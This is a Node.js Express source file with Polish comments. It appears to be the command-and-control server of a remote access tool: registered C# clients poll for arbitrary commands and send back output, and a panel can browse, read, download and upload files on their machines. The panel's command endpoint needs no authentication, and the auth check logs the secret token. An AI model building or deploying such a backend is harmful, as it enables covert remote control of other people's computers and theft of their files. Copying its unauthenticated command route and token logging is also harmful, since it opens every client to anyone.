import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

// Setup __dirname i dotenv (tylko lokalnie)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
if (process.env.NODE_ENV !== 'production') dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

const API_TOKEN = process.env.API_TOKEN;
const PANEL_PASSWORD = process.env.PANEL_PASSWORD;

if (!API_TOKEN || !PANEL_PASSWORD) {
  console.error("❌ Brak wymaganych zmiennych środowiskowych (API_TOKEN lub PANEL_PASSWORD).");
  process.exit(1);
}

const clients = new Set();
const commands = {};
const results = {};

// Nowa struktura na listę plików od klienta:
// { [clientName]: { currentPath: string, files: [{name, type}] } }
const fileTrees = {};

// Struktura na zawartość plików
const fileContents = {};

app.use(cors());
app.use(express.json({ limit: '50mb' })); // Zwiększ limit dla dużych plików
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Middleware autoryzujący tylko dla klienta (C#)
function authMiddleware(req, res, next) {
  const token = req.headers['authorization'];
  if (token !== `Bearer ${API_TOKEN}`) {
    console.log('Authorization failed. Expected:', `Bearer ${API_TOKEN}`, 'Got:', token);
    return res.status(403).json({ success: false, message: 'Forbidden – nieprawidłowy token' });
  }
  next();
}

// ------------------------ PANEL ----------------------------

// Logowanie panelu (sprawdzanie hasła)
app.post('/login', (req, res) => {
  const { password } = req.body;
  if (password === PANEL_PASSWORD) {
    res.json({ success: true });
  } else {
    res.status(403).json({ success: false });
  }
});

// Pobierz listę klientów - bez tokena
app.get('/clients', (req, res) => {
  res.json(Array.from(clients));
});

// Pobierz wynik klienta
app.get('/result', (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje klienta');
  const r = results[client];
  if (r) {
    delete results[client];
    return res.send(r);
  }
  res.status(204).send();
});

// --------------------- KLIENT C# --------------------------

// Klient zgłasza się i dodaje do listy
app.post('/register', authMiddleware, (req, res) => {
  const { client } = req.body;
  if (!client) return res.status(400).send('Brakuje klienta');
  clients.add(client);
  console.log(`✅ Klient zarejestrowany: ${client}`);
  res.sendStatus(200);
});

// Klient pobiera komendę
app.get('/command', authMiddleware, (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje klienta');
  const cmd = commands[client];
  if (cmd) {
    delete commands[client];
    console.log(`📤 Wysłano komendę do ${client}: ${cmd.substring(0, 100)}...`);
    return res.send(cmd);
  }
  res.status(204).send();
});

// Klient wysyła wynik
app.post('/result', authMiddleware, (req, res) => {
  const { client, result } = req.body;
  if (!client || !result) return res.status(400).send('Brakuje danych');
  results[client] = result;
  console.log(`📥 Otrzymano wynik od ${client}: ${result.substring(0, 100)}...`);
  res.sendStatus(200);
});

// Panel wysyła komendę do klienta
app.post('/command', (req, res) => {
  const { client, command } = req.body;
  if (!client || !command) return res.status(400).send('Brakuje danych');
  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
  commands[client] = command;
  console.log(`📝 Zaplanowano komendę dla ${client}: ${command}`);
  res.sendStatus(200);
});

// ------------------- Eksplorator plików (od klienta) --------------------

// Klient wysyła listę plików i folderów (dla podanej ścieżki)
app.post('/files', authMiddleware, (req, res) => {
  const { client, path, files } = req.body;
  if (!client || !path || !files) return res.status(400).send('Brakuje danych');

  // Zapisujemy dane
  fileTrees[client] = { currentPath: path, files };
  console.log(`📁 Otrzymano listę plików od ${client} dla ścieżki: ${path} (${files.length} elementów)`);

  res.sendStatus(200);
});

// Klient wysyła zawartość pliku
app.post('/file', authMiddleware, (req, res) => {
  const { client, path, content } = req.body;
  if (!client || !path || content === undefined) return res.status(400).send('Brakuje danych');

  // Zapisujemy zawartość pliku
  if (!fileContents[client]) {
    fileContents[client] = {};
  }
  fileContents[client][path] = content;
  console.log(`📄 Otrzymano zawartość pliku od ${client}: ${path} (${content.length} znaków)`);

  res.sendStatus(200);
});

// Panel pobiera listę plików i folderów dla klienta
app.get('/files', (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje klienta');

  const data = fileTrees[client];
  if (!data) return res.status(404).send('Brak danych o plikach');

  res.json(data);
});

// ------------------- API dla panelu (eksplorator plików) --------------------

// Panel żąda listy plików - wysyła komendę do klienta
app.get('/api/files', authMiddleware, (req, res) => {
  const path = req.query.path;
  const client = req.query.client;
  
  if (!path || !client) return res.status(400).json({ success: false, message: 'Brakuje parametrów' });
  if (!clients.has(client)) return res.status(404).json({ success: false, message: 'Klient nieznany' });

  console.log(`📂 Panel żąda listy plików od ${client}: ${path}`);

  // Wyślij komendę do klienta
  commands[client] = `listdir ${path}`;
  
  // Czekaj na odpowiedź (w praktyce panel powinien pollować)
  const checkForData = async () => {
    for (let i = 0; i < 30; i++) { // maksymalnie 15 sekund oczekiwania
      await new Promise(resolve => setTimeout(resolve, 500));
      const data = fileTrees[client];
      if (data && data.currentPath === path) {
        console.log(`✅ Zwrócono listę plików dla ${client}: ${path}`);
        return res.json(data);
      }
    }
    console.log(`⏰ Timeout dla listy plików ${client}: ${path}`);
    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
  };

  checkForData();
});

// Panel żąda zawartości pliku - wysyła komendę do klienta
app.get('/api/file', authMiddleware, (req, res) => {
  const path = req.query.path;
  const client = req.query.client;
  
  if (!path || !client) return res.status(400).json({ success: false, message: 'Brakuje parametrów' });
  if (!clients.has(client)) return res.status(404).json({ success: false, message: 'Klient nieznany' });

  console.log(`📖 Panel żąda zawartości pliku od ${client}: ${path}`);

  // Wyślij komendę do klienta
  commands[client] = `readfile ${path}`;
  
  // Czekaj na odpowiedź
  const checkForData = async () => {
    for (let i = 0; i < 30; i++) { // maksymalnie 15 sekund oczekiwania
      await new Promise(resolve => setTimeout(resolve, 500));
      if (fileContents[client] && fileContents[client][path] !== undefined) {
        const content = fileContents[client][path];
        // Usuń po pobraniu, aby nie zaśmiecać pamięci
        delete fileContents[client][path];
        console.log(`✅ Zwrócono zawartość pliku dla ${client}: ${path}`);
        return res.json({ content });
      }
    }
    console.log(`⏰ Timeout dla zawartości pliku ${client}: ${path}`);
    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
  };

  checkForData();
});

// Panel pobiera plik (download) - base64 encoded
app.get('/api/download', authMiddleware, (req, res) => {
  const path = req.query.path;
  const client = req.query.client;
  
  if (!path || !client) return res.status(400).json({ success: false, message: 'Brakuje parametrów' });
  if (!clients.has(client)) return res.status(404).json({ success: false, message: 'Klient nieznany' });

  console.log(`💾 Panel żąda pobrania pliku od ${client}: ${path}`);

  // Wyślij komendę do klienta
  commands[client] = `downloadfile ${path}`;
  
  // Czekaj na odpowiedź
  const checkForData = async () => {
    for (let i = 0; i < 60; i++) { // maksymalnie 30 sekund dla dużych plików
      await new Promise(resolve => setTimeout(resolve, 500));
      if (fileContents[client] && fileContents[client][path] !== undefined) {
        const base64Content = fileContents[client][path];
        // Usuń po pobraniu
        delete fileContents[client][path];
        
        try {
          // Konwertuj base64 na buffer
          const buffer = Buffer.from(base64Content, 'base64');
          const filename = path.split(/[\\/]/).pop();
          
          console.log(`✅ Plik ${filename} gotowy do pobrania (${buffer.length} bytes)`);
          
          res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
          res.setHeader('Content-Type', 'application/octet-stream');
          return res.send(buffer);
        } catch (e) {
          console.error(`❌ Błąd dekodowania pliku ${path}:`, e.message);
          return res.status(500).json({ success: false, message: 'Błąd dekodowania pliku' });
        }
      }
    }
    console.log(`⏰ Timeout dla pobierania pliku ${client}: ${path}`);
    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
  };

  checkForData();
});

// Panel wysyła plik (upload) - POPRAWIONA WERSJA
app.post('/api/upload', authMiddleware, (req, res) => {
  console.log('📤 Upload request received');
  console.log('Headers authorization:', req.headers['authorization'] ? 'Present' : 'Missing');
  console.log('Body keys:', Object.keys(req.body));
  
  const { client, path, content, filename } = req.body;
  
  if (!client || !path || !content || !filename) {
    console.log('❌ Missing parameters:', { 
      client: !!client, 
      path: !!path, 
      content: !!content, 
      filename: !!filename 
    });
    return res.status(400).json({ 
      success: false, 
      message: 'Brakuje parametrów (client, path, content, filename)' 
    });
  }
  
  if (!clients.has(client)) {
    console.log('❌ Unknown client:', client);
    console.log('Available clients:', Array.from(clients));
    return res.status(404).json({ 
      success: false, 
      message: `Klient nieznany: ${client}` 
    });
  }

  console.log(`📤 Uploading file ${filename} to client ${client} at path ${path}`);
  console.log(`Content size: ${content.length} characters`);
  
  // Wyślij komendę do klienta z zawartością pliku (base64)
  const fullPath = path.endsWith('\\') ? path + filename : path + '\\' + filename;
  commands[client] = `uploadfile ${fullPath} ${content}`;
  
  console.log(`📝 Command sent to client: uploadfile ${fullPath} [${content.length} chars base64]`);
  
  // Czekaj na potwierdzenie
  const checkForResult = async () => {
    for (let i = 0; i < 60; i++) { // maksymalnie 30 sekund
      await new Promise(resolve => setTimeout(resolve, 500));
      const result = results[client];
      if (result !== undefined) {
        console.log(`📥 Received result from client ${client}:`, result);
        delete results[client];
        if (result.includes('SUCCESS')) {
          console.log(`✅ Upload successful for ${filename}`);
          return res.json({ success: true, message: 'Plik został przesłany' });
        } else {
          console.log(`❌ Upload failed for ${filename}:`, result);
          return res.status(400).json({ success: false, message: result });
        }
      }
    }
    console.log(`⏰ Upload timeout for client ${client}, file ${filename}`);
    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
  };

  checkForResult();
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('❌ Server error:', error);
  res.status(500).json({ success: false, message: 'Błąd serwera' });
});

app.listen(port, () => {
  console.log(`✅ Serwer działa na porcie ${port}`);
  console.log(`🔑 API_TOKEN: ${API_TOKEN ? 'Skonfigurowany' : 'BRAK'}`);
  console.log(`🔒 PANEL_PASSWORD: ${PANEL_PASSWORD ? 'Skonfigurowany' : 'BRAK'}`);
});
